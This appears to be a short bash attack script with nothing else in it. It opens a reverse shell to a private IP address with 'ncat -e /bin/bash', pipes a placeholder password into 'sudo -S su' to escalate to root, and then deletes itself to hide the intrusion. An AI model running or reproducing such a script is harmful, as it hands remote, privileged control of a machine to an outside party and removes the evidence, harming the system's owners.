#!/bin/bash

# REV SHELL
ncat -e /bin/bash 172.24.9.106 1558

# SUDO REV SHELL SETUP
echo "<<DA PASSWORD>>" | sudo -S su

# RM SCRIPT
rm -- "$0"
